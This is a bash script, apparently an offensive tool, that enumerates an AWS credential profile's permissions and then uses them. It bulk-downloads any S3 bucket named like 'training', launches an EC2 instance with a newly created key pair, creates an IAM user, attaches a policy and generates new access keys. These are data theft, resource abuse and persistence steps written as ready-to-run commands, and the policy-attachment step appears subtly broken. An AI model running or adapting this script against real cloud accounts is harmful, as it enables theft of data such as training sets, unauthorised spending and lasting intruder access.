#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Default profile if none specified
AWS_PROFILE=${1:-default}
AWS_DEFAULT_REGION=us-west-1

echo "${YELLOW}[*] Starting AWS permission enumeration using profile: ${AWS_PROFILE}...${NC}\n"

# 1. Get current identity
echo "${GREEN}[+] Checking current identity...${NC}"
aws --profile ${AWS_PROFILE} sts get-caller-identity

# 2. List attached policies
echo "\n${GREEN}[+] Listing attached policies...${NC}"
aws --profile ${AWS_PROFILE} iam list-attached-user-policies --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# 3. List inline policies
echo "\n${GREEN}[+] Listing inline policies...${NC}"
aws --profile ${AWS_PROFILE} iam list-user-policies --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# 4. Check for sensitive permissions
echo "\n${GREEN}[+] Checking for sensitive permissions...${NC}"
aws --profile ${AWS_PROFILE} iam get-user-policy --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) --policy-name inline-policy 2>/dev/null

# 5. List S3 buckets
echo "\n${GREEN}[+] Listing S3 buckets...${NC}"
BUCKETS=$(aws --profile ${AWS_PROFILE} s3 ls | awk '{print $3}')
echo "$BUCKETS"

# 5a. Look for buckets with 'training' in the name and attempt to download their files
for bucket in $BUCKETS; do
    if [[ "$bucket" == *training* ]]; then
        echo "${RED}[!] Found bucket with 'training' in the name: $bucket. Attempting to download contents...${NC}"
        TMPDIR=$(mktemp -d)
        echo "${YELLOW}[*] Downloading s3://$bucket to $TMPDIR ...${NC}"
        aws --profile ${AWS_PROFILE} s3 sync s3://$bucket "$TMPDIR"
        echo "${GREEN}[+] Download complete for $bucket. Files stored in $TMPDIR${NC}"
    fi
done

# 6. Try to list EC2 instances
echo "\n${GREEN}[+] Listing EC2 instances...${NC}"
aws --profile ${AWS_PROFILE} ec2 describe-instances

# 7. Check for EC2 RunInstances permission and attempt to launch an instance if allowed
echo "\n${GREEN}[+] Checking EC2 RunInstances permission...${NC}"
aws --profile ${AWS_PROFILE} ec2 describe-instance-types --max-items 1 >/dev/null 2>&1
if aws --profile ${AWS_PROFILE} ec2 run-instances --dry-run --image-id ami-07706bb32254a7fe5 --instance-type t2.micro >/dev/null 2>&1; then
    echo "${GREEN}[+] EC2 RunInstances permission confirmed. Attempting to launch a t2.micro instance...${NC}"
    # 7a. Check if we can create a key pair
    KEY_NAME="test-key-$(date +%s)"
    KEY_FILE="${KEY_NAME}.pem"
    if aws --profile ${AWS_PROFILE} ec2 create-key-pair --key-name $KEY_NAME --query 'KeyMaterial' --output text > $KEY_FILE 2>/dev/null; then
        chmod 400 $KEY_FILE
        echo "${GREEN}[+] Created new key pair: $KEY_NAME and saved to $KEY_FILE${NC}"
        KEY_OPTION="--key-name $KEY_NAME"
    else
        echo "${YELLOW}[!] Could not create key pair. Proceeding without SSH key.${NC}"
        KEY_OPTION=""
    fi
    INSTANCE_ID=$(aws --profile ${AWS_PROFILE} ec2 run-instances --image-id ami-07706bb32254a7fe5 --instance-type t2.micro $KEY_OPTION --query 'Instances[0].InstanceId' --output text)
    if [ -n "$INSTANCE_ID" ]; then
        echo "${GREEN}[+] Launched EC2 instance: $INSTANCE_ID${NC}"
    else
        echo "${RED}[!] Failed to launch EC2 instance.${NC}"
    fi
else
    echo "${YELLOW}[!] No EC2 RunInstances permission or unable to launch instance.${NC}"
fi

# 8. Try to create a new IAM user
echo "\n${GREEN}[+] Attempting to create a new IAM user...${NC}"
aws --profile ${AWS_PROFILE} iam create-user --user-name test-user-$(date +%s)

# 9. Try to attach a policy
echo "\n${GREEN}[+] Attempting to attach a policy...${NC}"
aws --profile ${AWS_PROFILE} iam attach-user-policy --user-name test-user-$(date +%s) --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

# 10. Check for existing access keys
echo "\n${GREEN}[+] Checking for existing access keys...${NC}"
aws --profile ${AWS_PROFILE} iam list-access-keys --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# 11. Try to create new access keys
echo "\n${GREEN}[+] Attempting to create new access keys...${NC}"
aws --profile ${AWS_PROFILE} iam create-access-key --user-name $(aws --profile ${AWS_PROFILE} sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

echo "\n${YELLOW}[*] Enumeration complete. Check the output above for successful operations.${NC}" 